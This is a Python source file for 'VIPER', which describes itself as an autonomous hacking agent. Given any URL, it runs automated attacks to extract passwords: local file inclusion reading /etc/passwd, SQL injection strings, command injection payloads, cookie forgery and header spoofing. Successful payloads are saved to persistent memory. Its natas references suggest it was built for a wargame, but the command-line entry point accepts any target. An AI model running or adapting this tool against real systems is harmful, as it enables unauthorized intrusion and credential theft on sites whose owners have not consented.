#!/usr/bin/env python3
"""
VIPER Agentic AI - Full Autonomous Hacking Agent
=================================================

True agentic behavior:
1. Goal-directed: Given target, achieves objective
2. Planning: Creates multi-step attack plans
3. Tool use: HTTP, encoding, crypto, file ops
4. Memory: Learns from every attempt
5. Self-correction: Adapts when attacks fail
6. Persistence: Continues until goal or max attempts

VIPER autonomous security agent.

Author: VIPER Contributors
"""

import json
import logging

logger = logging.getLogger("viper.agentic_viper")
import re
import time
import hashlib
import base64
import urllib.request
import urllib.parse
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import html

# ============================================================================
# KNOWLEDGE & MEMORY SYSTEM
# ============================================================================

class Memory:
    """Persistent memory across sessions"""
    
    def __init__(self, path: str = None):
        if path is None:
            path = Path(__file__).parent.parent / "memory" / "viper_memory.json"
        self.path = Path(path)
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.data = self._load()
    
    def _load(self) -> Dict:
        if self.path.exists():
            try:
                return json.loads(self.path.read_text())
            except Exception as e:  # noqa: BLE001
                pass
        return {
            "successful_attacks": [],
            "failed_attacks": [],
            "learned_patterns": {},
            "target_history": {},
            "techniques": {},
            "session_count": 0
        }
    
    def save(self):
        self.data["last_save"] = datetime.now().isoformat()
        self.path.write_text(json.dumps(self.data, indent=2))
    
    def remember_success(self, target: str, technique: str, payload: str, result: str):
        self.data["successful_attacks"].append({
            "target": target,
            "technique": technique,
            "payload": payload,
            "result": result[:500],
            "timestamp": datetime.now().isoformat()
        })
        # Keep last 500
        self.data["successful_attacks"] = self.data["successful_attacks"][-500:]
        self.save()
    
    def remember_failure(self, target: str, technique: str, payload: str, error: str):
        self.data["failed_attacks"].append({
            "target": target,
            "technique": technique, 
            "payload": payload,
            "error": error[:200],
            "timestamp": datetime.now().isoformat()
        })
        # Keep last 200
        self.data["failed_attacks"] = self.data["failed_attacks"][-200:]
        self.save()
    
    def get_working_payloads(self, technique: str) -> List[str]:
        """Get payloads that worked before for this technique"""
        return [a["payload"] for a in self.data["successful_attacks"] 
                if a["technique"] == technique]
    
    def learn_pattern(self, name: str, pattern: Any):
        """Store a learned pattern"""
        self.data["learned_patterns"][name] = {
            "pattern": pattern,
            "learned_at": datetime.now().isoformat()
        }
        self.save()

# ============================================================================
# TOOLS - What VIPER can use
# ============================================================================

class Tools:
    """VIPER's toolkit"""
    
    @staticmethod
    def http_get(url: str, headers: Dict = None, auth: Tuple[str, str] = None) -> Tuple[int, str, Dict]:
        """HTTP GET request"""
        req = urllib.request.Request(url)
        if auth:
            creds = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
            req.add_header('Authorization', f'Basic {creds}')
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return resp.status, resp.read().decode('utf-8', errors='ignore'), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers)
        except Exception as e:
            return 0, str(e), {}
    
    @staticmethod
    def http_post(url: str, data: Dict, headers: Dict = None, auth: Tuple[str, str] = None) -> Tuple[int, str, Dict]:
        """HTTP POST request"""
        encoded = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=encoded, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        if auth:
            creds = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
            req.add_header('Authorization', f'Basic {creds}')
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return resp.status, resp.read().decode('utf-8', errors='ignore'), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers)
        except Exception as e:
            return 0, str(e), {}
    
    @staticmethod
    def decode_base64(s: str) -> str:
        try:
            return base64.b64decode(s).decode('utf-8', errors='ignore')
        except Exception as e:  # noqa: BLE001
            return ""
    
    @staticmethod
    def encode_base64(s: str) -> str:
        return base64.b64encode(s.encode()).decode()
    
    @staticmethod
    def decode_hex(s: str) -> str:
        try:
            return bytes.fromhex(s).decode('utf-8', errors='ignore')
        except Exception as e:  # noqa: BLE001
            return ""
    
    @staticmethod
    def encode_hex(s: str) -> str:
        return s.encode().hex()
    
    @staticmethod
    def url_encode(s: str) -> str:
        return urllib.parse.quote(s)
    
    @staticmethod
    def url_decode(s: str) -> str:
        return urllib.parse.unquote(s)
    
    @staticmethod
    def xor(data: bytes, key: bytes) -> bytes:
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    @staticmethod
    def md5(s: str) -> str:
        return hashlib.md5(s.encode()).hexdigest()
    
    @staticmethod
    def extract_password(text: str, current_pass: str = "") -> Optional[str]:
        """Find 32-char alphanumeric passwords"""
        matches = re.findall(r'[A-Za-z0-9]{32}', text)
        for m in matches:
            if m != current_pass:
                # Skip pure hex strings (likely encoded data, not passwords)
                if re.match(r'^[0-9a-fA-F]+$', m):
                    continue
                return m
        return None
    
    @staticmethod
    def extract_from_html(html_text: str) -> Dict:
        """Extract useful info from HTML"""
        result = {
            "comments": re.findall(r'<!--(.*?)-->', html_text, re.DOTALL),
            "forms": [],
            "links": re.findall(r'href=["\']([^"\']+)["\']', html_text),
            "params": re.findall(r'[?&]([a-zA-Z_]\w*)=', html_text),
            "inputs": re.findall(r'name=["\']([^"\']+)["\']', html_text),
            "scripts": re.findall(r'<script[^>]*>(.*?)</script>', html_text, re.DOTALL),
        }
        # Parse forms - handle forms with or without action attribute
        for form in re.finditer(r'<form[^>]*>(.*?)</form>', html_text, re.DOTALL | re.IGNORECASE):
            form_tag = re.search(r'<form[^>]*>', html_text, re.IGNORECASE)
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_tag.group(0) if form_tag else "")
            action = action_match.group(1) if action_match else ""
            inputs = re.findall(r'name=(["\']?)([^"\'\s>]+)\1', form.group(1))
            inputs = [i[1] for i in inputs]  # Extract just the name values
            result["forms"].append({"action": action, "inputs": inputs})
        return result

# ============================================================================
# REASONING ENGINE - How VIPER thinks
# ============================================================================

class ReasoningEngine:
    """VIPER's brain - decides what to try next"""
    
    def __init__(self, memory: Memory):
        self.memory = memory
        self.observations = []
        self.hypotheses = []
        self.plan = []
    
    def observe(self, observation: str):
        """Record an observation"""
        self.observations.append({
            "text": observation,
            "time": datetime.now().isoformat()
        })
    
    def hypothesize(self, hypothesis: str, confidence: float = 0.5):
        """Form a hypothesis about vulnerability"""
        self.hypotheses.append({
            "text": hypothesis,
            "confidence": confidence,
            "tested": False
        })
    
    def analyze_response(self, response: str, context: Dict) -> List[str]:
        """Analyze response and generate insights"""
        insights = []
        
        # Check for passwords
        pwd = Tools.extract_password(response, context.get("current_password", ""))
        if pwd:
            insights.append(f"PASSWORD_FOUND:{pwd}")
        
        # Check for errors revealing info
        if 'sql' in response.lower() or 'mysql' in response.lower():
            insights.append("SQL_ERROR_DETECTED")
        if 'warning' in response.lower() and 'php' in response.lower():
            insights.append("PHP_WARNING_DETECTED")
        if 'include' in response.lower() or 'require' in response.lower():
            insights.append("PHP_INCLUDE_DETECTED")
        
        # Check for successful indicators
        if 'password' in response.lower() or 'secret' in response.lower():
            insights.append("SENSITIVE_DATA_LEAK")
        if 'root:' in response or '/bin/bash' in response:
            insights.append("FILE_READ_SUCCESS")
        if 'uid=' in response or 'gid=' in response:
            insights.append("COMMAND_EXEC_SUCCESS")
        
        # Check HTML for clues
        html_info = Tools.extract_from_html(response)
        if html_info["comments"]:
            for c in html_info["comments"]:
                if len(c.strip()) > 10:
                    insights.append(f"HTML_COMMENT:{c.strip()[:100]}")
        if html_info["forms"]:
            insights.append(f"FORMS_FOUND:{len(html_info['forms'])}")
        if html_info["params"]:
            insights.append(f"PARAMS:{','.join(html_info['params'][:5])}")
        
        return insights
    
    def decide_next_action(self, target_info: Dict, tried: List[str]) -> Optional[Dict]:
        """Decide what to try next based on observations"""
        
        # Priority order of techniques
        techniques = [
            "check_source",
            "check_robots",
            "check_comments",
            "lfi_basic",
            "lfi_bypass",
            "sqli_basic",
            "sqli_blind",
            "cmdi_basic",
            "cmdi_bypass",
            "cookie_manipulation",
            "header_spoofing",
            "encoding_reverse",
            "xss_basic",
            "auth_bypass",
        ]
        
        for tech in techniques:
            if tech not in tried:
                return {"technique": tech}
        
        return None

# ============================================================================
# ATTACK MODULES - Specific attack implementations  
# ============================================================================

class AttackModules:
    """Individual attack implementations"""
    
    def __init__(self, tools: Tools, memory: Memory):
        self.tools = tools
        self.memory = memory
    
    def check_source(self, url: str, auth: Tuple) -> Dict:
        """Check for source code disclosure"""
        paths = ['index-source.html', 'source.php', '.index.php.swp', 'index.phps', 'index.php.bak']
        for path in paths:
            test_url = urllib.parse.urljoin(url, path)
            status, body, _ = Tools.http_get(test_url, auth=auth)
            if status == 200 and len(body) > 100:
                return {"success": True, "path": path, "content": body}
        return {"success": False}
    
    def check_robots(self, url: str, auth: Tuple) -> Dict:
        """Check robots.txt"""
        test_url = urllib.parse.urljoin(url, '/robots.txt')
        status, body, _ = Tools.http_get(test_url, auth=auth)
        if status == 200 and 'disallow' in body.lower():
            paths = re.findall(r'Disallow:\s*(\S+)', body, re.IGNORECASE)
            return {"success": True, "paths": paths, "content": body}
        return {"success": False}
    
    def check_comments(self, body: str) -> Dict:
        """Extract info from HTML comments"""
        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        passwords = []
        hints = []
        for c in comments:
            pwd = Tools.extract_password(c)
            if pwd:
                passwords.append(pwd)
            if len(c.strip()) > 5:
                hints.append(c.strip())
        if passwords or hints:
            return {"success": True, "passwords": passwords, "hints": hints}
        return {"success": False}
    
    def lfi_basic(self, url: str, auth: Tuple, params: List[str]) -> Dict:
        """Basic LFI attack"""
        payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "../../../etc/natas_webpass/natas{next}",
            "....//....//....//etc/natas_webpass/natas{next}",
        ]
        
        for param in params[:3]:
            for payload in payloads:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                status, body, _ = Tools.http_get(test_url, auth=auth)
                
                if 'root:' in body or '/bin/' in body or 'natas' in body.lower():
                    pwd = Tools.extract_password(body, auth[1] if auth else "")
                    return {"success": True, "payload": f"{param}={payload}", "password": pwd, "response": body[:500]}
        
        return {"success": False}
    
    def sqli_basic(self, url: str, auth: Tuple, form: Dict = None, params: List[str] = None) -> Dict:
        """Basic SQL injection"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "\" OR \"1\"=\"1",
            "admin'--",
            "1' OR '1'='1",
        ]
        
        if form:
            action = urllib.parse.urljoin(url, form.get("action", ""))
            inputs = form.get("inputs", [])
            
            for payload in payloads:
                data = {i: payload for i in inputs}
                status, body, _ = Tools.http_post(action, data, auth=auth)
                
                if any(x in body.lower() for x in ['welcome', 'success', 'logged', 'password']):
                    pwd = Tools.extract_password(body, auth[1] if auth else "")
                    return {"success": True, "payload": str(data), "password": pwd}
        
        if params:
            for param in params[:3]:
                for payload in payloads:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    status, body, _ = Tools.http_get(test_url, auth=auth)
                    
                    if 'sql' in body.lower() or 'mysql' in body.lower():
                        return {"success": True, "payload": f"{param}={payload}", "type": "error_based"}
        
        return {"success": False}
    
    def cmdi_basic(self, url: str, auth: Tuple, params: List[str]) -> Dict:
        """Basic command injection"""
        payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "$(cat /etc/passwd)",
            "; cat /etc/natas_webpass/natas{next}",
            "| cat /etc/natas_webpass/natas{next}",
        ]
        
        for param in params[:3]:
            for payload in payloads:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                status, body, _ = Tools.http_get(test_url, auth=auth)
                
                if 'root:' in body or 'uid=' in body:
                    pwd = Tools.extract_password(body, auth[1] if auth else "")
                    return {"success": True, "payload": f"{param}={payload}", "password": pwd}
        
        return {"success": False}
    
    def cookie_manipulation(self, url: str, auth: Tuple, cookies: Dict) -> Dict:
        """Try cookie manipulation"""
        # Common cookie tricks
        modifications = [
            {"loggedin": "1"},
            {"admin": "1"},
            {"user": "admin"},
            {"authenticated": "true"},
        ]
        
        for mod in modifications:
            headers = {"Cookie": "; ".join(f"{k}={v}" for k, v in mod.items())}
            status, body, _ = Tools.http_get(url, headers=headers, auth=auth)
            
            if any(x in body.lower() for x in ['password', 'secret', 'flag', 'access granted']):
                pwd = Tools.extract_password(body, auth[1] if auth else "")
                return {"success": True, "cookie": mod, "password": pwd}
        
        return {"success": False}
    
    def header_spoofing(self, url: str, auth: Tuple) -> Dict:
        """Try header spoofing (Referer, X-Forwarded-For, etc)"""
        spoofs = [
            {"Referer": url.replace(url.split('.')[0].split('//')[-1], url.split('.')[0].split('//')[-1].replace(url.split('natas')[1][0], str(int(url.split('natas')[1][0])+1)))},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
        ]
        
        for headers in spoofs:
            status, body, _ = Tools.http_get(url, headers=headers, auth=auth)
            
            pwd = Tools.extract_password(body, auth[1] if auth else "")
            if pwd:
                return {"success": True, "headers": headers, "password": pwd}
        
        return {"success": False}

# ============================================================================
# MAIN AGENT - Agentic VIPER
# ============================================================================

class AgenticVIPER:
    """
    Full autonomous hacking agent
    
    Usage:
        viper = AgenticVIPER()
        result = viper.hack("http://target.com", goal="find_password", auth=("user", "pass"))
    """
    
    def __init__(self):
        self.memory = Memory()
        self.tools = Tools()
        self.attacks = AttackModules(self.tools, self.memory)
        self.reasoning = ReasoningEngine(self.memory)
        self.log_entries = []
        self.memory.data["session_count"] += 1
        self.memory.save()
    
    def log(self, msg: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] [{level}] {msg}"
        self.log_entries.append(entry)
        print(entry, flush=True)
    
    def hack(self, url: str, goal: str = "find_password", 
             auth: Tuple[str, str] = None, max_attempts: int = 30) -> Dict:
        """
        Main entry point - autonomously hack target
        
        Args:
            url: Target URL
            goal: What to achieve (find_password, get_shell, etc)
            auth: Optional (username, password)
            max_attempts: Max techniques to try
        
        Returns:
            Dict with success status, password if found, findings
        """
        self.log(f"TARGET: {url}")
        self.log(f"GOAL: {goal}")
        self.log(f"SESSION: #{self.memory.data['session_count']}")
        
        result = {
            "success": False,
            "password": None,
            "findings": [],
            "techniques_tried": [],
            "url": url
        }
        
        # Phase 1: Initial recon
        self.log("PHASE 1: Reconnaissance", "PHASE")
        status, body, headers = Tools.http_get(url, auth=auth)
        
        if status == 0:
            self.log(f"Failed to connect: {body}", "ERROR")
            return result
        
        self.log(f"Status: {status}, Size: {len(body)} bytes")
        
        # Extract info from response
        html_info = Tools.extract_from_html(body)
        self.reasoning.observe(f"Initial page: {len(body)} bytes, {len(html_info['forms'])} forms, params: {html_info['params']}")
        
        # Check for password in initial response
        pwd = Tools.extract_password(body, auth[1] if auth else "")
        if pwd:
            self.log(f"PASSWORD FOUND IN INITIAL PAGE: {pwd}", "SUCCESS")
            result["success"] = True
            result["password"] = pwd
            self.memory.remember_success(url, "initial_page", "none", pwd)
            return result
        
        # Phase 2: Systematic attack
        self.log("PHASE 2: Attack Sequence", "PHASE")
        
        attempts = 0
        techniques = [
            ("check_comments", lambda: self.attacks.check_comments(body)),
            ("check_source", lambda: self.attacks.check_source(url, auth)),
            ("check_robots", lambda: self.attacks.check_robots(url, auth)),
            ("lfi_basic", lambda: self.attacks.lfi_basic(url, auth, html_info['params'] or ['page', 'file', 'path'])),
            ("sqli_basic", lambda: self.attacks.sqli_basic(url, auth, html_info['forms'][0] if html_info['forms'] else None, html_info['params'])),
            ("cmdi_basic", lambda: self.attacks.cmdi_basic(url, auth, html_info['params'] or ['cmd', 'exec', 'search'])),
            ("cookie_manipulation", lambda: self.attacks.cookie_manipulation(url, auth, {})),
            ("header_spoofing", lambda: self.attacks.header_spoofing(url, auth)),
        ]
        
        for tech_name, tech_func in techniques:
            if attempts >= max_attempts:
                break
            
            attempts += 1
            self.log(f"Trying: {tech_name}")
            result["techniques_tried"].append(tech_name)
            
            try:
                tech_result = tech_func()
                
                if tech_result.get("success"):
                    self.log(f"HIT: {tech_name}", "SUCCESS")
                    result["findings"].append({
                        "technique": tech_name,
                        "details": tech_result
                    })
                    
                    # Check for password
                    if tech_result.get("password"):
                        self.log(f"PASSWORD: {tech_result['password']}", "SUCCESS")
                        result["success"] = True
                        result["password"] = tech_result["password"]
                        self.memory.remember_success(url, tech_name, str(tech_result), tech_result["password"])
                        return result
                    
                    # Check hints for password
                    if tech_result.get("hints"):
                        for hint in tech_result["hints"]:
                            pwd = Tools.extract_password(hint)
                            if pwd:
                                self.log(f"PASSWORD FROM HINT: {pwd}", "SUCCESS")
                                result["success"] = True
                                result["password"] = pwd
                                return result
                    
                    # Check content for password
                    if tech_result.get("content"):
                        pwd = Tools.extract_password(tech_result["content"], auth[1] if auth else "")
                        if pwd:
                            self.log(f"PASSWORD FROM CONTENT: {pwd}", "SUCCESS")
                            result["success"] = True
                            result["password"] = pwd
                            return result
                    
                    self.memory.remember_success(url, tech_name, str(tech_result)[:200], "no_password")
                else:
                    self.memory.remember_failure(url, tech_name, "standard", "no_success")
                    
            except Exception as e:
                self.log(f"Error in {tech_name}: {e}", "ERROR")
                self.memory.remember_failure(url, tech_name, "exception", str(e))
        
        # Phase 3: Summary
        self.log("PHASE 3: Complete", "PHASE")
        self.log(f"Findings: {len(result['findings'])}")
        self.log(f"Password found: {result['success']}")
        
        return result
    
    def get_session_log(self) -> str:
        return "\n".join(self.log_entries)


# ============================================================================
# CLI
# ============================================================================

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python agentic_viper.py <url> [username] [password]")
        sys.exit(1)
    
    url = sys.argv[1]
    auth = None
    if len(sys.argv) >= 4:
        auth = (sys.argv[2], sys.argv[3])
    
    viper = AgenticVIPER()
    result = viper.hack(url, auth=auth)
    
    print("\n" + "="*50)
    print("RESULT:", "SUCCESS" if result["success"] else "FAILED")
    if result["password"]:
        print(f"PASSWORD: {result['password']}")
    print(f"FINDINGS: {len(result['findings'])}")
